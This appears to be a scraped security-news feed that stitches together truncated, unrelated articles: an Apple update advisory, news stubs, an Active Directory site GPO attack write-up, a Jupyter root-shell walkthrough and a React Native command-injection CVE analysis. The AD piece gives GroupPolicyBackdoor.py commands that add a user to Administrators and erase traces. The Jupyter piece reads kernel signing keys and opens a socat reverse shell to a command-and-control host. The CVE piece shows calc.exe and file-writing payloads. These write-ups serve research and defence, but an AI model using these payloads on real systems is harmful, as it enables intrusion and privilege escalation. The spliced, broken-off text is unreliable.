Some of these bugs could let cybercriminals see your private data, take control of parts of your device, or break key security protections.Installing these updates as soon as possible keeps your personal information—and everything else on your Apple devices—safe from attack.Although Apple never releases full details before everyone has had a chance to apply the updates, two serious security flaws stand out:This vulnerability is a permission issue which is fixed in iOS 26.1 and iPadOS 26.1. It could allow an app to identify which other apps a user has installed. You can imagine that if a banking Trojan—like this one on Android—can see which banking apps and crypto wallets someone uses they can maximize their social engineering strategies to target that user. This is a privacy issue in watchOS 26.1, visionOS 26.1, iOS 26.1, and iPadOS 26.1. It allows malicious apps to capture screenshots of sensitive information in embedded views. Apple addressed this by tightening privacy checks and isolation policies.Updates for your particular deviceThis table shows which updates are available and points you to the relevant security content fot that operating system (OS).How to update your devicesHow to update your iPhone or iPadFor iOS and iPadOS users, here’s how to check if you’re using the latest software version:Go to  >  > . Turn on  if you haven’t already—you’ll find it on the same screen.How to update macOS on any versionTo update macOS on any supported Mac, use the Software Update feature, which Apple designed to work consistently across all recent versions. Here are the steps:Click the Apple menu in the upper-left corner of your screen.Choose  (or  on older versions).Select  in the sidebar, then click  on the right. On older macOS, just look for  directly.Your Mac will check for updates automatically. If updates are available, click  (or  for major new versions) and follow the on-screen instructions. Before you upgrade to macOS Tahoe 26, please read these instructions.Enter your administrator password if prompted, then let your Mac finish the update (it might need to restart during this process).Make sure your Mac stays plugged in and connected to the internet until the update is done.How to update Apple WatchEnsure your iPhone is paired with your Apple Watch and connected to Wi-Fi, then:Keep your Apple Watch on its charger and close to your iPhone.Open the Watch app on your iPhone.Tap >.If an update appears, tap .Enter your iPhone passcode or Apple ID password if prompted.Your Apple Watch will automatically restart during the update process. Make sure it remains near your iPhone and on charge until the update completes.Turn on your Apple TV and make sure it’s connected to the internet, then:Open the Settings app on Apple TV.Navigate >.If an update appears, select .The Apple TV will download the update and restart as needed. Keep your device connected to power and Wi-Fi until the process finishes.How to update your Safari browserSafari updates are included with macOS updates, so installing the latest version of macOS will also update Safari. To check manually:Open the >>>.If you see a Safari update listed separately, click  to install it.Restart your Mac when prompted.If you’re on an older macOS version that’s still supported (like Sonoma or Sequoia), Apple may offer Safari updates independently through Software Update.Xcode is Apple’s developer tool for building apps, so most people won’t have this, but if you do, you’ll need to keep it updated. Xcode updates come through the :Open the  on your Mac.Click  in the sidebar.If an Xcode update is available, click  next to it.You can also search for “Xcode” directly and click  or  if you’ve uninstalled it.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>U.S. Sanctions 10 North Korean Entities for Laundering $12.7M in Crypto and IT Fraud</title><link>https://thehackernews.com/2025/11/us-sanctions-10-north-korean-entities.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXIMlJnqx7E3-6UYncV_kGW3LUD3e8ePPnKZ2nWmTSdjlvSMeVGwCwVaJQCYk6KCKcvnmiu1_Ujh_eqgtEJ3JYO2-FVzKTcDFiw5wmXacWEMwFhc3VtV8ZTenImisM-4talaTVCUqZHk1rxXoqY6b4kyHTh53q_OjRYj_MTznsoqhgb_0B8QAVWRc_KVV2/s1600/it-workers.jpg" length="" type=""/><pubDate>Wed, 5 Nov 2025 10:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The U.S. Treasury Department on Tuesday imposed sanctions against eight individuals and two entities within North Korea's global financial network for laundering money for various illicit schemes, including cybercrime and information technology (IT) worker fraud.

Active Directory Sites are a feature allowing to optimize network performance and bandwidth usage in AD internal environments. They are commonly implemented by large, geographically dispersed organizations spanning accross multiple countries or continents.

Sites did not receive much attention by the Active Directory offensive research community, comparatively to other ACL-based attack vectors. This article aims to demonstrate that not only do attack vectors targeting Active Directory sites exist, but that they can lead to impactful privilege escalation scenarios and to domain(s) compromise.

We will describe a pull request that we submitted to the BloodHound project in order to enumerate Site ACL attack paths, and how to exploit those paths in an efficient way with the tools that we recently released, related to GPO-based exploit vectors. Said compromise scenarios may allow attackers to elevate their privileges, as well as move laterally within an Active Directory forest.

## Introduction

Sites are associated with the physical representation of an Active Directory environment, rather than with the identity side of it. As such, they may have been considered by the research community as less interesting from a security standpoint, and relegated to a situational, production-related / functional feature not offering real offensive opportunities.

While it is true that not all organizations rely on Active Directory sites for network distribution, this article aims to demonstrate that, when they exist, site-based ACL attack vectors can prove rather powerful and lead to the compromise of one or several domains. As a result, sites can be considered as critical infrastructure components, that are worth including in popular attack path visualisation tools such as BloodHound.

A documented, but lesser known exploitation technique relying on sites will also be described in this article. The exploitation of such a vector may allow an attacker to move laterally within a forest without being hindered by any SID filtering configuration. We will show how it can be concretely exploited, taking advantage of the recent GPO offensive tooling that we released a few months ago.

## 1\. Active Directory sites 101

This first section will clarify what exactly Active Directory sites are, and how they are concretely implemented in Active Directory. If you are familiar with these concepts, feel free to skip ahead.

As was briefly mentioned above, Active Directory sites are all about **network efficiency and bandwidth usage optimization**. Sites are objects to which highly connected **subnets** are assigned – all the objects that are in these subnets (the computers as well as the users connecting to these computers) are part of the site. A site associates the resources from the grouped subnets for two main purposes:

- **Replication**. In Active Directory, when a change is applied to a specific domain controller, other domain controllers (from the same domain for domain data, and across the forest for the schema and configuration partitions – see part 5 for more details) need to replicate it. There are two types of Active Directory replication: **intra-site** replication, and **inter-site** replication. Because the resources within a single site can communicate pretty fast, intra-site replication is performed by default rather regularly (every 5 minutes). As inter-site replication is more demanding network-wise, the bandwidth is compressed and Active Directory allows administrators to define the replication's settings through site links (180 minutes by default).
- **Authentication**. A site should be assigned one or several **servers**, which are nothing more than domain controllers responsible for the site. Objects that are part of the site will prioritize the domain controllers that are configured as servers for the site.

By default, there exists only one site in a forest (named **Default-First-Site-Name**). Until another site is created, all objects are automatically assigned to this site and all replication is performed intra-site. If an administrator wishes to add another site, it must be configured and a **site link** must be assigned to it. A site link allows replication to take place between two sites, and defines the settings of the replication (for instance, the replication schedule). By default, site links are transitive, meaning that if site A is linked to site B, and site A is linked to site C, then site B is transitively linked to site C. This is performed via a **site bridge**, which is created automatically if the transitive attribute of site links was not explicitly disabled by an administrator.

Note that it is entirely possible to have orphaned sites that, due to a misconfiguration, are not linked with one another. This may obviously cause some serious issues in the environment, as the replication process will not take place, leading to discrepancies between domain controllers’ data.

Finally, it is important to mention that Active Directory sites are not in any way associated with domains repartition. A site may contain clients and domain controllers from various, distinct domains of the forest. This is why Active Directory domains handle the logical segmentation of the internal network resources, whereas sites constitute the **physical**, geographical representation of the environment.

More concretely, **Sites, subnets, and site links** are all LDAP objects located in the **configuration naming context** that is replicated forest-wide – in the `CN=Sites,CN=Configuration,DC=corp,DC=com` container (more details on this in part 5).

Managing sites can be performed from the **Sites and Services** Active Directory GUI.

## 2\. Why care?

Now that the concepts behind Active Directory sites are a bit clearer, why should we, from an offensive standpoint, care about it? Especially if sites are only used to group objects for network efficiency purposes?

As it turns out, it is possible to **assign Group Policy Objects**(GPOs) to Active Directory sites. The site objects have a gPLink attribute, describing the GPOs that **all the objects associated with the site** will apply. This makes sense, as some location-specific configurations may need to be applied by sites (firewall rules, browser favourites, visual identity, etc.). But this also makes for **interesting GPO-based attack vector opportunities**.

Indeed, if an attacker was somehow able to link a malicious GPO to a site, or to poison a GPO already linked to it, they could compromise **all the objects of the site**, including **the domain controllers** that are acting as site servers.

Several ACL-based attack paths may enable such a scenario, which is why Active Directory site ACLs should be considered interesting – or even critical when enumerating Active Directory environments.

## 3\. Sites enumeration: integrating Active Directory sites into BloodHound

We observed that, consistent with the low popularity of sites in Active Directory offensive research, no tool seems to currently collect and enumerate site ACLs in order to highlight potential high-impact attack paths. More specifically, the BloodHound go-to tool for Active Directory attack paths enumeration and visualisation does not yet include this kind of data.

Although dangerous ACLs affecting sites may not be as frequent as other misconfigurations related to more common object types, it is important to catch them when they exist, due to the high potential impact they can have. Which is why we just submitted a pull request to SharpHound, the SharpHoundCommon library, as well as to the BloodHound project. These pull request implement the following features:

- Collect data about
   **sites**, site **servers**, and site **subnets** when enumerating data from the Active Directory environment.
- Represent site data in the BloodHound interface, by associating each site with the related server and subnet objects.

- Add sites to the default
   **high value targets**, as control over a site results in the potential compromise of all objects associated with the site, including at least one domain controller acting as the site server.
- Create control edges targeting site objects (
   **GenericAll**, **GenericWrite**, **WriteGPLink**), as these permissions are exploitable (more on that in the next part).
- Integrate
   **GPLink** edges from Group Policy Objects to sites, in order to enumerate when a GPO affects a site (making control over such a GPO all the more interesting).

The following screenshots represent a preview of the pull request. **Please note that this is only provided for information purposes. The actual implementation will of course depend on the** **pull request’s review performed by** **BloodHound’s team**. If the pull request goes through, both visual representation and implementation may vary.

## 4\. Exploiting sites « GPO-style » for privilege escalation and domain(s) compromise

Now that the enumeration part is covered, the next section will concretely describe the different exploitation scenarios that can affect site objects, and how to exploit them.

_a. Controlling a GPO linked to a site_

The first exploitation scenario is the most straightforward, and occurs when a user has any kind of write privileges over a Group Policy Object that is linked to a site. In that case, said user may inject a malicious configuration into the site-linked GPO, and compromise any (or all) object(s) associated with the site.

For the rest of this section, demonstrations will be performed with the following environment in mind. A corporation has an Active Directory forest, with the **corp.com** root domain. It has three sites: the default **Default-First-Site-Name** site (for the main offices of the organization in Paris), as well as the **NewYork** and **Sidney** sites for its regional offices.

Let us assume that an attacker compromised the **adove** user, which has control over the **Paris\_Servers\_Firewall\_Rules** GPO. This GPO is linked to the **Default-First-Site-Name** default site, which has one server, **AD01-DC** from the **corp.com** root domain.

This can be exploited by injecting a malicious configuration into the **Paris\_Servers\_Firewall\_Rules** GPO, and waiting for the **AD01-DC** domain controller to apply it in order to compromise the DC’s domain.

To do so, the GroupPolicyBackdoor.py tool that we recently released can be used. It provides a stable exploitation framework for GPO manipulation in python. The project’s wiki describes in details how the tool works, and provides command examples. In a nutshell, the configuration that one wishes to inject into the target GPO is described by an **ini** file. While various configurations are supported (see the `modules_templates` directory), we will inject a simple immediate Scheduled Task into the GPO, that adds our controlled **adove** user to the local administrators group. Note that we are also only targeting the **AD01-DC** domain controller by using a **Computer Name filter**, since we do not want all the computers in the site to execute our task. The following file `ImmediateTask_create.ini` is created:

```
[MODULECONFIG] name = Scheduled Tasks type = computer [MODULEOPTIONS] task_type = immediate program = cmd.exe arguments = /c "net localgroup Administrators corp.com\adove /add" [MODULEFILTERS] filters = [ { "operator": "AND", "type": "Computer Name", "value": "ad01-dc.corp.com" } ]
```

The described configuration can now simply be injected into the target GPO with the `gpo inject` command.

```
$ python3 gpb.py gpo inject -d 'corp.com' --dc ad01-dc.corp.com -u 'adove' -p 'Password1' -m ImmediateTask_create.ini -n "Paris_Servers_Firewall_Rules"GPB - INJECT command - 2025-10-30 15:04:24.346517 [#] Command execution setup [+] All modules validated [*] State folder is state_folders/2025_10_30_150424 [#] Generating XML payloads for modules [+] Successfully generated XML for all payloads [#] Writing modules XML to the Group Policy Template via SMB [*] Writing module Scheduled Tasks (computer) [#] Updating GPO extension names in the Group Policy Container via LDAP [+] 'gPCMachineExtensionNames' successfully updated [#] Increasing the GPO version via LDAP and SMB [+] Successfully increased LDAP GPO version [+] Successfully increased SMB GPO version [+] GPB INJECT command success
```

All that is left to do, is wait for the target domain controller to apply the malicious Scheduled Task, and add the **adove** user to the local Administrators group – meaning, the Domain Admins group of the **corp.com** domain. GPO refresh for domain controllers happens every 5 minutes, after which it is possible to verify that our user is indeed local administrator of the domain controller, by connecting to the administrative `C$` share.

```
$ smbclient '\\ad01-dc.corp.com\C$' -U 'corp.com\adove' --password 'Password1'Try "help" to get a list of possible commands. smb: \> dir $Recycle.Bin DHS 0 Thu Dec 21 09:28:19 2023 $WinREAgent DH 0 Thu Jun 12 18:37:16 2025 Documents and Settings DHSrn 0 Thu Dec 21 18:06:11 2023 DumpStack.log.tmp AHS 12288 Thu Oct 30 22:25:32 2025 pagefile.sys AHS 738197504 Thu Oct 30 22:25:32 2025 PerfLogs D 0 Sat May 8 01:20:24 2021 Program Files DR 0 Thu Dec 21 18:57:48 2023 Program Files (x86) D 0 Thu Dec 21 09:29:25 2023 ProgramData DHn 0 Tue Aug 26 00:10:17 2025 [...]
```

GroupPolicyBackdoor.py can then be used to remove the injected configuration with the `gpo clean` command, in order to remove exploitation traces.

```
$ python3 gpb.py gpo clean -d corp.com --dc ad01-dc.corp.com -u 'adove' -p 'Password1' -sf state_folders/2025_10_30_150424GPB - CLEAN command - 2025-10-30 15:11:19.450167 [#] Command execution setup [*] State folder is state_folders/2025_10_30_151119 [#] Cleaning configuration of type Scheduled Tasks (computer) [*] Cleaning configuration with identifier {22E4F6F1-6E6C-4449-8CD0-8D8CD76211A5} [*] Found the XML node to remove [*] Deleting empty file \\ad01-dc.corp.com\SYSVOL\corp.com\Policies\{CFD9229F-488C-445D-9829-8B8A443E0575}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml [*] Extension names should be updated [+] Successfully cleaned configuration Scheduled Tasks (computer) [+] Successfully updated extension names ('gPCMachineExtensionNames')[+] GPB CLEAN command success
```

_b. Exploiting GenericAll, GenericWrite or WriteGPLink rights over a site_

The second exploitation scenario happens when a user has either **GenericAll**, **GenericWrite** or **WriteGPLink** permissions over a site. This may happen because of nested group memberships or configurations mishaps that are commonly observed in Active Directory environments. But this can also result from a deliberate administrative choice. Indeed, Active Directory explicitly allows administrators to delegate the ability to manage Group Policy links for a site.

The **GenericAll**, **GenericWrite** and **WriteGPLink** ACLs all allow to do one interesting thing from an attacker standpoint: alter the **gPLink** attribute of the site.

The **gPLink** attribute is an LDAP attribute that indicates which GPO is linked to the container (domain, Organizational Unit or, in our case, site). With the ability to modify the **gPLink**’s value, an attacker may trick the objects linked to the target container into applying a malicious GPO. This can be achieved in two ways.

The first way is the most straightforward. If an attacker controls any GPO in the domain, they would be able to inject a malicious configuration into it, and then link it to the target site, taking advantage of their **G** **enericAll**, **G** **enericWrite** or **WriteGPLink** permissions. Again, this can be performed using the GroupPolicyBackdoor.py tool. The commands needed to inject a malicious configuration into a GPO are the same as the one described above. Linking the altered GPO can then be executed with the `links link` command.

```
$ python3 gpb.py links link -d corp.com --dc ad01-dc.corp.com -o 'CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com' -n 'CONTROLLED' -u 'aacre' -p 'Password1'GPB - LINK command - 2025-10-30 15:21:00.734878 [#] Command execution setup [*] State folder is state_folders/2025_10_30_152100 [#] Creating link for 1 containers [*] Creating link for 'CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com' [+] Successfully created link on 'CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com'[+] GPB LINK command success
```

In case the attacker does not have control over a GPO, the **GenericAll**, **GenericWrite** or **WriteGPLink** ACLs can still be abused with limited prerequisites. The technique involved was first described by **Petros Koutroumpis** in his great research “OU having a laugh”. We later built upon it to demonstrate how this technique could be used to compromise protected objects in Organizational Units or exploit limited OU rights in the following article. We also released a tool automating the attack, OUned.py.

The principle behind the attack is explained in details in Petros Koutroumpis’ article, as well as in ours. We will not go over it in details again. The core principle of the attack is to add a GPO link to the **gPLink** attribute of the target container (here, the site). This GPO link points to a DNS name resolving to a machine under the attacker’s control, e.g. `s1n.corp.com`:

```
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=s1n,DC=corp,DC=com;0]
```

Objects associated with the site would then try to fetch the GPO on the attacker’s machine, which would simulate a valid Group Policy Container (LDAP), as well as a valid Group Policy Template (SMB) to serve the malicious GPO the clients are trying to apply, thus compromising said clients.

Here is a quick demonstration using OUned.py. Let’s assume that the **aacre** user has **WriteGPLink** permissions over the **NewYork** site, which has the **AD01-DC2** site server as domain controller of **corp.com**:

OUned.py takes a configuration file, such as the following:

```
[GENERAL] # The target domain name domain=corp.com # The target DC. If not specified, defaults to the domain name dc=ad01-dc2.corp.com # The Distinguished Name of the target container - here, the site containerDN=CN=NewYork,CN=Sites,CN=Configuration,DC=corp,DC=com # The username and password of the user having write permissions on the gPLink attribute of the target site username=aacre password=Password1 # The IP address of the attacker machine on the internal network attacker_ip=192.168.123.17 # The command that should be executed by child objects.

No GUI, no browser, just a terminal, limited tunneling options, and whatever command-line tools I could find.

It’s code execution as a service, basically.My first instinct was to check if the Jupyter server was accessible$ curl -s localhost:8888/api/status | jq .  "started": "2025-12-01T10:23:45.123456Z",  "last_activity": "2025-12-01T14:32:10.654321Z",  "connections": 2,}It was. The API was responding, and even better—no authentication token required. This meant the server was either running with  or I was accessing it from a trusted network. Either way, Christmas came early.Here's where things got a little more interesting. Jupyter's REST API documentation showed an interesting endpoint: . Unlike the kernel API (which executes Python code), the terminal API provides actual shell access. And I could create a terminal session fairly easily.# Create a terminal session$ curl -X POST localhost:8888/api/terminals{"name": "1", "last_activity": "2024-12-01T14:45:32.123456Z"}But there’s a catch. Terminals in Jupyter communicate over WebSocket, not HTTP. Traditional tools like  or  wouldn't work. I needed something that could speak WebSocket from the command line.After some research, I discovered —essentially netcat for WebSockets. It's a binary that bridges the gap between command-line tools and WebSocket services. Perfect for situations like this.With websocat in hand, I could now interact with Jupyter's terminal WebSocket, but it wasn’t immediately obvious how to send commands from there terminal. The Jupyter Client WebSocket documentation on WebSocket protocols provides some details about how messages are passed between kernels and the Jupyter web application. And the Terminado client’s websocket implementation outlines the format needed to interact with Jupyter.So when you connect to a Jupyter terminal via WebSocket, you're not getting a raw shell - you're talking to a protocol handler that expects JSON arrays where thefirst element is message type (, , , etc.)second element is the payload (for stdin, it's the command text)This lets Jupyter multiplex different data streams (input, output, control messages) over a single WebSocket connection. So sending  is how you talk to Jupyter's terminal WebSocket protocol.And when you connect, it seems to take a second to initialize the WebSocket connection, and it wouldn’t immediately take my commands, so the elegant solution is to sleep. And so, echoing a command like this:‍$ (sleep 1; echo '["stdin", "id\\n"]'; sleep 1; echo '["stdin", "exit\\n"]') | ./websocat "ws://localhost:8888/terminals/websocket/1"# returns this["setup", {}]["stdout", "\\u001b[?2004h/home/jupyter $ "]["stdout", "id\\r\\n"]["stdout", "uid=0(root) gid=0(root) groups=0(root)\\r\\n"]UID 0? Of course, the Jupyter server was running as root, and the terminal API was giving me a root shell. No sudo required, no privilege escalation needed—just ask nicely and receive.With root access through the terminal, I could now read Jupyter's runtime files:$ (sleep 1; echo '["stdin", "cat /root/.local/share/jupyter/runtime/kernel-*.json\\n"]'; \\   sleep 1; echo '["stdin", "exit\\n"]') | \\  /tmp/websocat "ws://localhost:8888/terminals/websocket/1"These kernel connection files contained:Connection ports for each running kernelHMAC signing keys for message authenticationWith these, I could connect directly to any running notebook kernel and execute code in other users' sessions. Session hijacking for data science.For easier interaction, I established a proper reverse shell:$ (sleep 1; echo '["stdin", "socat exec:\\"bash -li\\",pty,stderr,setsid,sigint,sane tcp:my.c2.server:4444 &\\n"]';    sleep 1; echo '["stdin", "exit\\n"]') | ./websocat "ws://localhost:8888/terminals/websocket/1"Now I had a fully interactive root shell, running through Jupyter's own process. To any monitoring system, this might look like legitimate Jupyter activity.This isn't a vulnerability in Jupyter—it's a deployment anti-pattern. - Jupyter was running with root privileges, probably because someone needed GPU access or wanted to avoid permission issues The server was started with authentication disabled, for convenience The terminal feature was enabled (default in many installations)Together, these created a perfect storm. Any user with local access could escalate to root through Jupyter's intended functionality.Don’t Run Jupyter as Root# BadUSER rootCMD ["jupyter", "notebook"]RUN useradd -m jupyterCMD ["jupyter", "notebook"]Use Proper Multi-User SystemsIf you need multi-user Jupyter, use tools designed for it:# JupyterHub with SystemUserSpawnerc.JupyterHub.spawner_class = 'systemdspawner.SystemUserSpawner'c.SystemUserSpawner.default_shell = '/bin/bash'c.SystemUserSpawner.isolate_tmp = Truec.SystemUserSpawner.isolate_devices = TrueImplement Capability-Based SecurityNeed GPU access without root?

Or disable authentication for convenience. Treat development defaults as production-ready.Jupyter is great for interactive data science. The terminal API is genuinely useful for package installation and environment debugging. But these same features are ripe for abuse if deployed without proper consideration.Asking "what happens when this feature meets a hostile user?" during deployment should be a mantra.Downloading websocat and echoing commands is fine for janky use, but how about a little client to drop into a shell?go run main.go -url http://127.0.0.1:8888 -token <snip>Created terminal: 1Connecting to: ws://127.0.0.1:10000/terminals/websocket/1?token=<snip>2025/06/04 16:12:25 Terminal ready(base) jovyan@f604a11544c7:~$ Jupyter Terminal ShellType 'exit' or press Ctrl+C to quit----------------------------------------iduid=1000(jovyan) gid=100(users) groups=100(users)]]></content:encoded></item><item><title>A Cybercrime Merger Like No Other — Scattered Spider, LAPSUS$, and ShinyHunters Join Forces</title><link>https://thehackernews.com/2025/11/a-cybercrime-merger-like-no-other.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihGoqSoqWGCpoOD7hmLTjkWzWhFLusgvTr3g3RaGZWrSs_j4LAGbruNNztuHBQy5D835G8qsA6p2Go0Mw-aSoiHC7eY4-tGNEgXffrQPOIuEiEm0-n6gZHeq156nYnq9S_jRSk22aXI3X7aXXoCJwRRKdMN20Hf4M266ZMRZEsv7NhJTuPWBT6U3OlhQBE/s1600/hackers.jpg" length="" type=""/><pubDate>Tue, 4 Nov 2025 17:25:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The nascent collective that combines three prominent cybercrime groups, Scattered Spider, LAPSUS$, and ShinyHunters, has created no less than 16 Telegram channels since August 8, 2025.

The vulnerability is in a package which is part of the broader React Native Community CLI project that was extracted from the core react-native codebase a few years ago to improve maintainability. The CLI is a collection of command line tools that help developers build React Native mobile applications. It is officially used for creating React Native mobile apps without using a framework, as well as React Native for Windows, React Native for macOS, and more.Unlike typical vulnerabilities in development servers that are only exploitable from a developer’s local machine, a second security issue that the team spotted in React Native’s core codebase, exposes the development serverto external network attacks – making the former vulnerability a highly critical issue.Who is affected by CVE-2025-11953?Developers who initiated their React Native project with a vulnerable version of @react-native-community/cli, and run the Metro development server via one of the following or similar commands are vulnerable to CVE-2025-11953: npm start
 npm run [start|android|ios|windows|macos]
 npx react-native [start|run-android|run-ios|run-windows|run-macos]
 npx @react-native-community/cli [start|run-android|run-ios|run-windows|run-macos]
While the vulnerability is exploitable by default when initiating a react-native project using @react-native-community/cli, it is important to understand that not every developer that has this library installed as a dependency is necessarily vulnerable.Specifically, developers who use React Native with a framework that doesn’t use Metro as the development server are typically not vulnerable.The vulnerability directly affects the @react-native-community/cli-server-api package, versions 4.8.0 to 20.0.0-alpha.2, and is fixed since version 20.0.0.Here is how to check whether the vulnerable package exists in a specific NodeJS project: cd <Project Folder>
 npm list @react-native-community/cli-server-api
The package may also be globally installed on your system, which can be checked by running: npm list -g @react-native-community/cli-server-api
Note that the affected package is commonly bundled with @react-native-community/cli in matching versions. As a result, projects using @react-native-community/cli versions 4.8.0 through 20.0.0‑alpha.2 are likely to include vulnerable versions of @react-native-community/cli-server-api.On Windows, we have proven that this vulnerability leads to arbitrary OS command execution (shell commands with full parameter control). On macOS and Linux, the vulnerability leads to execution of arbitrary executables with limited parameter control. Arbitrary OS command execution on these platforms may be achievable with further research.How can CVE-2025-11953 be mitigated?Performing the following steps will mitigate CVE-2025-11953:Update @react-native-community/cli-server-api to version 20.0.0 or higher, which includes a fix for this vulnerability, in each of your react-native projects. This is the recommended solution.For improved security, or if upgrading is not possible, bind the development server to the localhost interface explicitly, by including the “–host 127.0.0.1” flag, per the examples below: npx react-native start --host 127.0.0.1
 npx @react-native-community/cli start --host 127.0.0.1
The Metro development server, which is opened by @react-native-community/cli, binds to external interfaces by default (a small security issue in itself). The server’s  endpoint handles a POST request that includes a user-input value that is passed to the unsafe  function provided by the open NPM package, which will cause OS command execution.This allows an unauthenticated network attacker to send a POST request to the server and execute arbitrary shell commands with attacker-controlled parameters.CVE-2025-11953 Technical DetailsWhen creating a React Native project, developers can choose to , such as Expo, which uses the framework’s CLI and is not vulnerable, or  – as we’ll choose here – if they prefer to write their own framework or have certain constraints that a certain framework interferes with.The development process typically begins by using the @react-native-community/cli to initialize a new project with the command npx @react-native-community/cli init MyApp, which sets up the necessary project structure, dependencies, and configuration files. During active development, developers rely on the CLI to run the Metro development server (using commands like ) which serves the JavaScript bundle to the running app (on an emulator or mobile device) and enables essential development features like hot reloading and fast refresh for rapid iteration.While running  – react-native’s cli.js forwards the command to @react-native-community/cli package (an optional dependency of react-native), which runs its build\index.js::setupAndRun() function. This function loads the CLI commands (i.e. ) by calling , which finds and uses the node-modules/react-native/react-native.config.js file in the process. const commands = [];
 const {
   bundleCommand,
   startCommand,
 } = require('@react-native/community-cli-plugin');
 commands.push(bundleCommand, startCommand);
node-modules/react-native/ – adds the  to an exported commands list that is then added to the CLI commands list.The react-native.config.js file imports  from @react-native/community-cli-plugin – that is responsible for running the development server. import runServer from './runServer';
 /* ... */
 const startCommand: Command = {
   name: 'start',
   func: runServer,
   description: 'Start the React Native development server.',

 import {createDevServerMiddleware} from './middleware'; /* *** 1 *** */

 /* ... */

 /* *** 2 *** */
 const { middleware:  } = createDevServerMiddleware({
     host: hostname,
     port,
     watchFolders,
   });

 /* ... */

   /* *** 3 *** */
   await (metroConfig, {
     host: args.host,
     secure: args.https,
     secureCert: args.cert,
     secureKey: args.key,
     unstable_extraMiddleware: [, middleware],
     websocketEndpoints: {
       ...communityWebsocketEndpoints,
       ...websocketEndpoints,
     },
   });
 does the following:Imports the createDevServerMiddleware function from , which imports it from @react-native-community/cli-server-api’s index.ts.Runs createDevServerMiddleware, which creates  – a function added to an HTTP server that intercepts incoming requests, adds functionality, and then passes them to the next handler. In our case, the  handler that interests us is , which is handled by the  handler. The middleware is set to the  variable.Runs the Metro server, with  as a parameter. This is the CLI’s development server.Now let’s look at the  handler that was added to the server as part of : async function openURLMiddleware(req: IncomingMessage, ...) {
   if (req.method === 'POST') {

     /* ... */

     const {url} = req.body as {url: string};

     await open(url);

     /* ... */

   }
   next();
 }
 export default connect().use(json()).use(openURLMiddleware);
This function is called with an HTTP request  parameter, that is a JSON POST request, with a  string field. It takes the value of the ’s field, which is an unsanitized string coming directly from the user, and uses it as a parameter to  call. does the following on Windows machines:
Sets  to run to be “cmd”Builds the  array: ['/c', 'start', '""', '/b']Escapes & with ^ in the  which is the url we supplied.Adds  string to the Runs the following command:childProcess.spawn(command, cliArguments, childProcessOptions);While the  cmd command can accept a single URL param and open it inside the default browser due to its HTTP URI scheme, it also accepts the following format for running commands:start “title” /b command optional_command_parametersIn the case of , the following new process will be spawned: cmd /c start “” /b calc.exe
Resulting in execution of calc.exe.For running any arbitrary command, we could set open’s  parameter to a  command. For example, resulting in spawning the following: cmd /c start "" /b cmd /c echo abc > c:\temp\pwned.txt
Attack surfaces on different operating systemsUnlike Windows, as shown above, the open package uses different code paths on macOS and Linux, executing  and  respectively. In Unix-like OSs, the spawned process expects each argument to be a separate string in , which is unlike Windows where the spawned process expects a single  argument string that is joined before the  invocation.Furthermore, both commands are executed without a shell. Combined with the fact that we only control a single string (url) – these factors will not allow straightforwardly running arbitrary commands on macOS and Linux.Both xdg-open and open determine whether the input string is a file or URI – and act (dispatch) accordingly.The attack surface for achieving code execution in these OSs may depend on the system’s configuration and typically comprises of:Finding a URI scheme whose handler can help achieve a step in the exploitation (either as a feature or exploit a vulnerability in the handler itself).Executing a local file by using a regular or file:// URI scheme. (optionally could be combined with a file-dropper primitive).Executing a remote file on the attacker’s server by using smb:// ,dav:// URI schemes or similar. (will likely trigger security dialogues asking for the victim user’s approval)In conclusion – arbitrary OS command execution on these platforms may be achievable with further research.Shouldn’t the dev server only bind to localhost?As we’ve shown earlier, while running the Metro development server, it explicitly states that it is starting using the localhost interface:However – in reality, we can see the server is listening on all interfaces! (0.0.0.0 and IPv6 [::]):As mentioned previously, this is due to another vulnerability that we’ve discovered and disclosed in @react-native/community-cli-plugin, which was regarded as “Informative”.By running , the code reaches the runServer.js::runServer function: async function runServer(
   _argv: Array,
   cliConfig: Config,
   args: StartCommandArgs,
 ) {

   /* ... */

   const hostname = args.host?.length ? args.host : 'localhost'; // *** 1 ***

   /* ... */

   const protocol = args.https === true ? 'https' : 'http';
   const devServerUrl = url.format({protocol, hostname, port}); // *** 2 ***

   /* ... */

   console.info(`Starting dev server on ${devServerUrl}\n`); // *** 3 ***

   /* ... */

   await Metro.runServer(metroConfig, {
     host: args.host, // *** 4 ***
Relevant parts of runServer function from runServer.js holds the  parameter, if supplied, or . is formed using hostname.The misleading message “Starting dev server on http://localhost:8081” is printed. function, responsible for running the Metro development server is called with the host being , which is , instead of using the  variable.Later on, Metro’s runServer’s code uses this undefined parameter when calling “If host is omitted, the server will accept connections on the unspecified IPv6 address (::) when IPv6 is available, or the unspecified IPv4 address (0.0.0.0) otherwise. In most operating systems, listening to the unspecified IPv6 address (::) may cause the net.Server to also listen on the unspecified IPv4 address (0.0.0.0).”Explicitly passing  is functionally equivalent to omitting the parameter. Thus, the server by default will listen for external connections.As a result – the development-only HTTP endpoints are exposed to .This vulnerability shows that even straightforward Remote Code Execution flaws, such as passing user input to the system shell, are still found in real-world software, especially in cases where the dangerous sink function actually resides in 3rd-party code, which was the imported “open” function in this case. It’s a reminder that secure coding practices and automated security scanning are essential for preventing these easily exploitable flaws before they make it to production.A good way to avoid these and similar vulnerabilities in your own code is by deploying JFrog Advanced Security’s SAST scanning which enables developers to identify and fix security issues early in the development process. With zero configuration required, JFrog SAST integrates seamlessly into existing workflows through IDE plugins and CLI tools, giving developers easy access to actionable findings without interrupting their flow.For example, in the screenshot below we can see how JFrog SAST discovers the above vulnerability, when scanned as 1st party code directly from within Visual Studio Code:JFrog SAST highlights the vulnerability in the code along with its details and provides Data Trace Evidence that shows the data flow from the user-input req.body field until it is used as an input to the dangerous open function.To stay on top of other attacks and zero-day vulnerabilities, make sure to check out the JFrog Security Research center for the latest on CVEs, vulnerabilities and 